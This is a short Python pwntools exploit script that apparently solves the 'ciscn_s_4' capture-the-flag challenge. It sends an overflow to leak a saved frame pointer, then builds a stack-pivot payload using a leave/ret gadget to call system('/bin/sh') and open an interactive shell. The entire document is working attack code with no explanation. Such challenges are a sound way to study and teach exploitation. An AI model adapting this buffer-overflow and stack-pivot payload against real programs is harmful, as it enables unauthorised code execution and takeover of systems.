from pwn import *

context.log_level = 'debug'

proc_name = 'ciscn_s_4'
#p = remote('node3.buuoj.cn',28060)
p = process(proc_name)
elf = ELF(proc_name)
leave_addr = 0x8048562
system_addr = 0x8048400
#system_addr = 0x08048559

padding = 'a' * 0x24
string = 'jkjk'
payload1 = padding + string

p.send(payload1)
p.recvuntil(string)

fake_ebp=u32(p.recv(4))
print('fake_ebp: ', hex(fake_ebp))
buf_addr = fake_ebp - 56

payload2=('aaaa'+p32(system_addr) + 'bbbb' + p32(buf_addr + 16) + '/bin/sh\x00').ljust(0x28, 'a') + p32(buf_addr) + p32(leave_addr)
p.send(payload2)
p.interactive()

